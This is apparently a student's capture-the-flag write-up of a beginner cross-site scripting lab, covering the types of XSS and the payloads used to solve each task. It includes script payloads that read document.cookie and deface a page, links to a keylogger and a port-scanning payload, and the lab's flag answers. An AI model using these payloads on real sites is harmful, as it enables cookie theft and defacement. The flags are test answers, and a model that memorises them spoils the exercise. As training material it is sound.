# Cross-Site Scripting

**Date:** 01, January, 2021

**Author:** Dhilip Sanjay S

---

## XSS
- XSS a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine.
- A web app is vulnerable to XSS if it uses unsanitized user input.
- XSS is possible in :
    - Javascript
    - VBscript
    - Flash
    - CSS
- Three types of XSS:
    - **Stored XSS-** Malicious string originates from the website's database. This happens when attacker is able to insert a malicious code into the database.
    - **Reflected XSS-** MAlicious payload is part of victims request to the website. The attacker need to trick a victim into clicking a URL to execute their malicious payload
    - **DOM-based XSS-** DOM (Document Object Model) is a programming interface for HTML and XML document. It can change the document (refers to web page) structure, style and content.

## XSS Payloads
- Popups - `<script>alert(“Hello World”)</script>`
- Writing HTML (defacing the entire page)
- [XSS Key logger](http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) 
- [Port Scanning](http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html)
- For more payloads:
    - [XSS Payloads.com](http://www.xss-payloads.com/)

---
## Solutions

### Craft a reflected XSS payload that will cause a popup saying "Hello"
- **Answer:** ThereIsMoreToXSSThanYouThink
- **Steps to Reproduce:** 
    ```js
    <script>alert(Hello)</script>
    ```
---

### On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
- **Answer:** ReflectiveXss4TheWin
- **Steps to Reproduce:** 
    ```js
    <script>alert(window.location.hash)</script>
    ```
---

### "Stored XSS" tab - Add a comment and see if you can insert some of your own HTML.
- **Answer:** HTML_T4gs
- **Steps to Reproduce:** `<h1>Hello</h1>`

---

### On the same page, create an alert popup box appear on the page with your document cookies.
- **Answer:** W3LL_D0N3_LVL2s
- **Steps to Reproduce:** 
    ```js
    <script>alert(document.cookie)</script>
    ```
---

### Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
- **Answer:** websites_can_be_easily_defaced_with_xss
- **Steps to Reproduce:** 
    ```js
    <script>document.getElementById("thm-title").innerText = "I am a hacker"</script>

    <script>document.querySelector("#thm-title").textContent = 'I am a hacker'</script>
    ```
---